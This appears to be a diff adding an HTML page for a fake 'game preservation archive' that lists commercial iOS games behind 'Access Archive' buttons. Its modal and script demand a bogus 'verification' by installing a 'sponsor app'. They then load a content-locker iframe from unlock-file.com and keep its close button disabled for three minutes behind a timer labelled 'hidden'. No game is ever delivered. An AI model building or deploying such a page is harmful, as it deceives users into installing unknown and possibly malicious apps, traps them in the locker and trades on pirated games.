+                <article class="game-card" aria-label="Catalog Entry: Flappy Bird (2013)">
+                    <div class="card-cover" style="background-image: url('https://upload.wikimedia.org/wikipedia/en/thumb/0/0a/Flappy_Bird_icon.png/220px-Flappy_Bird_icon.png');" aria-hidden="true">
+                        <span class="card-cover-label">Catalog #MS-2013-FLB</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-ios">iOS IPA</span>
+                        </div>
+                        <p class="card-title">Flappy Bird (2013)</p>
+                        <p class="card-description">
+                            A culturally historic study in extreme input frustration, computational simplicity, and hyper-viral digital distribution, preserved following its sudden voluntary deletion.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Flappy Bird">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Angry Birds Classic (2009)">
+                    <div class="card-cover" style="background-image: url('https://upload.wikimedia.org/wikipedia/en/thumb/1/1a/Angry_Birds_App_Store_Icon.png/220px-Angry_Birds_App_Store_Icon.png');" aria-hidden="true">
+                        <span class="card-cover-label">Catalog #MS-2009-AGB</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-ios">iOS IPA</span>
+                        </div>
+                        <p class="card-title">Angry Birds Classic (2009)</p>
+                        <p class="card-description">
+                            A seminal showcase of touch-drag trajectory physics and destructive collision simulations, defining early smartphone-native gaming mechanics and mass cultural impact.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Angry Birds Classic">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Asphalt 6: Adrenaline (2010)">
+                    <div class="card-cover" style="background-image: url('https://upload.wikimedia.org/wikipedia/en/thumb/8/87/Asphalt_6_Adrenaline.jpg/220px-Asphalt_6_Adrenaline.jpg');" aria-hidden="true">
+                        <span class="card-cover-label">Catalog #MS-2010-ASP6</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-ios">iOS IPA</span>
+                        </div>
+                        <p class="card-title">Asphalt 6: Adrenaline (2010)</p>
+                        <p class="card-description">
+                            A benchmark in 3D mobile arcade racing, pushing the limits of early gyroscopic controls and high-speed polygon rendering on handheld devices.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Asphalt 6">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Bit.Trip Beat (2010)">
+                    <div class="card-cover" style="background-image: url('https://upload.wikimedia.org/wikipedia/en/thumb/0/07/Bit.Trip_Beat_cover.png/220px-Bit.Trip_Beat_cover.png');" aria-hidden="true">
+                        <span class="card-cover-label">Catalog #MS-2010-BTB</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-ios">iOS IPA</span>
+                        </div>
+                        <p class="card-title">Bit.Trip Beat (2010)</p>
+                        <p class="card-description">
+                            An intersection of chiptune rhythm mechanics and classic Pong-style gameplay, perfectly translated to touch-screen gestural interfaces.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Bit.Trip Beat">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Metal Gear Solid Touch (2009)">
+                    <div class="card-cover" style="background-image: url('https://upload.wikimedia.org/wikipedia/en/thumb/0/05/Metal_Gear_Solid_Touch.jpg/220px-Metal_Gear_Solid_Touch.jpg');" aria-hidden="true">
+                        <span class="card-cover-label">Catalog #MS-2009-MGS</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-ios">iOS IPA</span>
+                        </div>
+                        <p class="card-title">Metal Gear Solid Touch (2009)</p>
+                        <p class="card-description">
+                            An early experimental shooting gallery adapting a AAA console franchise to the constraints and unique interactions of early mobile screens.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Metal Gear Solid Touch">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Serious Sam: Kamikaze Attack! (2011)">
+                    <div class="card-cover" style="background-image: url('https://upload.wikimedia.org/wikipedia/en/2/29/Serious_Sam_Kamikaze_Attack%21.jpg');" aria-hidden="true">
+                        <span class="card-cover-label">Catalog #MS-2011-SSK</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-ios">iOS IPA</span>
+                        </div>
+                        <p class="card-title">Serious Sam: Kamikaze Attack! (2011)</p>
+                        <p class="card-description">
+                            An indie-developed mobile spin-off transitioning the chaotic 3D shooter into an auto-running 2D action game centered on the iconic Beheaded Kamikaze.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Serious Sam">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: SimCity Deluxe (2010)">
+                    <div class="card-cover" style="background-image: url('https://placehold.co/400x250/1c1c2b/42f5a1?text=SimCity+Deluxe');" aria-hidden="true">
+                        <span class="card-cover-label">Catalog #MS-2010-SCD</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-ios">iOS IPA</span>
+                        </div>
+                        <p class="card-title">SimCity Deluxe (2010)</p>
+                        <p class="card-description">
+                            A complex mobile simulation experience that brought full-scale isometric city-building and resource management to early smartphones.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — SimCity Deluxe">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: FIFA 11 (2010)">
+                    <div class="card-cover" style="background-image: url('https://upload.wikimedia.org/wikipedia/en/thumb/3/30/FIFA_11_Cover.jpg/220px-FIFA_11_Cover.jpg');" aria-hidden="true">
+                        <span class="card-cover-label">Catalog #MS-2010-F11</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-ios">iOS IPA</span>
+                        </div>
+                        <p class="card-title">FIFA 11 (2010)</p>
+                        <p class="card-description">
+                            A cornerstone in early mobile sports simulation, delivering surprisingly deep physics and virtual joystick controls on early capacitive screens.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — FIFA 11">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Urban Crime (2012)">
+                    <div class="card-cover" style="background-image: url('https://placehold.co/400x250/1c1c2b/f56d6d?text=Urban+Crime');" aria-hidden="true">
+                        <span class="card-cover-label">Catalog #MS-2012-URC</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-ios">iOS IPA</span>
+                        </div>
+                        <p class="card-title">Urban Crime (2012)</p>
+                        <p class="card-description">
+                            An ambitious attempt at a free-to-play open-world 3D sandbox, preserving a key transition era for mobile monetization models.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Urban Crime">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+            </div>
+        </section>
+
+    </main>
+
+    <!-- ============================================================
+       FOOTER
+  ============================================================ -->
+    <footer>
+        <p>
+            <strong>The Game Repository</strong> &mdash; An open-access archival repository for digital preservation.
+            Curated by researchers, historians, and preservationists.
+        </p>
+        <p style="margin-top:0.5rem;">
+            &copy; <span id="footer-year"></span> The Game Repository. All materials are archived under educational
+            fair-use provisions.
+        </p>
+    </footer>
+
+    <!-- ============================================================
+       MODAL — Archival Access Agreement (accessible)
+  ============================================================ -->
+    <div class="modal-overlay" id="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="modal-heading"
+        aria-describedby="modal-desc">
+        <!-- Clicking the overlay itself (but not the modal panel) closes it -->
+        <div class="modal" id="modal-panel" role="document">
+
+            <!-- Close (X) -->
+            <button class="modal-close" id="modal-close-btn" aria-label="Close modal">&#x2715;</button>
+
+            <!-- Icon -->
+            <div class="modal-icon" aria-hidden="true">🏛️</div>
+
+            <!-- Heading & description -->
+            <h2 id="modal-heading">Access Verification Required</h2>
+            <p class="modal-body-text" id="modal-desc">
+                Access to this digital repository entry requires a quick verification step.
+                Please install the sponsor app to initiate the retrieval process and download the game.
+            </p>
+
+            <!-- Info notice -->
+            <div class="modal-notice" role="note">
+                <strong>Sponsorship Verification:</strong> Open-access downloads are supported by our sponsors.
+                Installing the sponsor app helps validate user access and supports our ongoing digital archiving.
+            </div>
+
+            <!-- Numbered steps -->
+            <ol class="modal-steps" aria-label="Steps to unlock archival download">
+                <li>
+                    <span class="step-num" aria-hidden="true">1</span>
+                    <span class="step-text">Click <strong>"Download Sponsor App"</strong> below to open our sponsor's page in a new tab.</span>
+                </li>
+                <li>
+                    <span class="step-num" aria-hidden="true">2</span>
+                    <span class="step-text">Install and open the sponsor application on your device to verify your session.</span>
+                </li>
+                <li>
+                    <span class="step-num" aria-hidden="true">3</span>
+                    <span class="step-text">Return to this page to activate the download window, then click
+                        <strong>"Proceed to Download"</strong>.</span>
+                </li>
+            </ol>
+
+            <div class="modal-divider" aria-hidden="true"></div>
+
+            <!-- Action buttons -->
+            <div class="modal-actions">
+                <!-- Sponsor CTA -->
+                <button id="sponsor-link" class="btn-primary" aria-label="Open sponsor application window">
+                    Download Sponsor App ↗
+                </button>
+
+                <!-- Proceed (initially disabled) -->
+                <button class="btn-proceed" id="proceed-btn" aria-disabled="true"
+                    aria-label="Proceed to Download — install sponsor app first to unlock" disabled>
+                    Proceed to Download
+                </button>
+            </div>
+
+        </div><!-- /.modal -->
+    </div><!-- /.modal-overlay -->
+
+    <!-- ============================================================
+       MODAL — Sponsor Content Locker (Iframe)
+    ============================================================ -->
+    <div class="modal-overlay" id="iframe-overlay" role="dialog" aria-modal="true" aria-label="Sponsor Content Locker">
+        <div class="modal modal-iframe" id="iframe-panel" role="document">
+            <button class="modal-close" id="iframe-close-btn" aria-label="Close sponsor window">&#x2715;</button>
+            <iframe id="sponsor-iframe" src="" title="Sponsor Locker"></iframe>
+        </div>
+    </div>
+
+    <!-- ============================================================
+       JAVASCRIPT
+  ============================================================ -->
+    <script>
+        /* ---- Footer year ---- */
+        document.getElementById('footer-year').textContent = new Date().getFullYear();
+
+        /* ---- Modal elements ---- */
+        const overlay = document.getElementById('modal-overlay');
+        const panel = document.getElementById('modal-panel');
+        const closeBtn = document.getElementById('modal-close-btn');
+        const sponsorLink = document.getElementById('sponsor-link');
+        const proceedBtn = document.getElementById('proceed-btn');
+
+        const iframeOverlay = document.getElementById('iframe-overlay');
+        const iframeCloseBtn = document.getElementById('iframe-close-btn');
+        const sponsorIframe = document.getElementById('sponsor-iframe');
+
+        /* ---- State ---- */
+        let sponsorVisited = false;
+
+        /* ---- Open modal ---- */
+        function openModal() {
+            overlay.classList.add('is-open');
+            document.body.classList.add('modal-open');
+            // Focus the close button for keyboard users
+            closeBtn.focus();
+        }
+
+        /* ---- Close modal ---- */
+        function closeModal() {
+            overlay.classList.remove('is-open');
+            document.body.classList.remove('modal-open');
+        }
+
+        /* ---- Enable Proceed button after sponsor link click ---- */
+        function enableProceed() {
+            if (!sponsorVisited) {
+                sponsorVisited = true;
+                proceedBtn.classList.add('is-active');
+                proceedBtn.removeAttribute('disabled');
+                proceedBtn.removeAttribute('aria-disabled');
+                proceedBtn.setAttribute('aria-label', 'Proceed to Download');
+            }
+        }
+
+        /* ---- Event: all Download buttons (event delegation on <main> + <body>) ---- */
+        document.addEventListener('click', function (e) {
+            if (e.target.matches('.btn-download')) {
+                // Reset sponsor state each time a new download is initiated
+                sponsorVisited = false;
+                proceedBtn.classList.remove('is-active');
+                proceedBtn.setAttribute('disabled', '');
+                proceedBtn.setAttribute('aria-disabled', 'true');
+                proceedBtn.setAttribute('aria-label', 'Proceed to Download — install sponsor app first to unlock');
+                openModal();
+            }
+        });
+
+        let iframeCloseTimeout;
+
+        /* ---- Event: Sponsor link clicked ---- */
+        sponsorLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (!sponsorIframe.src || sponsorIframe.src === window.location.href) {
+                sponsorIframe.src = "https://unlock-file.com/?2ff9230";
+            }
+            iframeOverlay.classList.add('is-open');
+            document.body.classList.add('modal-open');
+            
+            // Hidden 3-minute timer for the close button
+            iframeCloseBtn.setAttribute('disabled', 'true');
+            iframeCloseBtn.style.opacity = '0.4';
+            iframeCloseBtn.style.cursor = 'not-allowed';
+            
+            clearTimeout(iframeCloseTimeout);
+            iframeCloseTimeout = setTimeout(() => {
+                iframeCloseBtn.removeAttribute('disabled');
+                iframeCloseBtn.style.opacity = '';
+                iframeCloseBtn.style.cursor = '';
+            }, 180000); // 180,000 ms = 3 minutes
+        });
+
+        /* ---- Close Iframe Modal ---- */
+        function closeIframeModal() {
+            iframeOverlay.classList.remove('is-open');
+            if (!overlay.classList.contains('is-open')) {
+                document.body.classList.remove('modal-open');
+            }
+            enableProceed();
+            closeBtn.focus();
+        }
+
+        /* ---- Event: Iframe Close button & Overlay ---- */
+        iframeCloseBtn.addEventListener('click', closeIframeModal);
+        
+        iframeOverlay.addEventListener('click', function (e) {
+            if (e.target === iframeOverlay && !iframeCloseBtn.hasAttribute('disabled')) {
+                closeIframeModal();
+            }
+        });
+
+        /* ---- Event: Close button ---- */
+        closeBtn.addEventListener('click', closeModal);
+
+        /* ---- Event: Proceed button ---- */
+        proceedBtn.addEventListener('click', function () {
+            if (proceedBtn.classList.contains('is-active')) {
+                closeModal();
+            }
+        });
+
+        /* ---- Event: Overlay background click (but not panel itself) ---- */
+        overlay.addEventListener('click', function (e) {
+            if (!panel.contains(e.target)) {
+                closeModal();
+            }
+        });
+
+        /* ---- Event: Escape key ---- */
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'Escape') {
+                if (iframeOverlay.classList.contains('is-open')) {
+                    if (!iframeCloseBtn.hasAttribute('disabled')) {
+                        closeIframeModal();
+                    }
+                } else if (overlay.classList.contains('is-open')) {
+                    closeModal();
+                }
+            }
+        });
+
+        /* ---- Trap focus inside modal while open ---- */
+        overlay.addEventListener('keydown', function (e) {
+            if (e.key !== 'Tab') return;
+            const focusable = panel.querySelectorAll(
+                'button:not([disabled]), a[href], [tabindex]:not([tabindex="-1"])'
+            );
+            const first = focusable[0];
+            const last = focusable[focusable.length - 1];
+
+            if (e.shiftKey) {
+                if (document.activeElement === first) {
+                    e.preventDefault();
+                    last.focus();
+                }
+            } else {
+                if (document.activeElement === last) {
+                    e.preventDefault();
+                    first.focus();
+                }
+            }
+        });
+    </script>
+
+</body>
+
+</html>
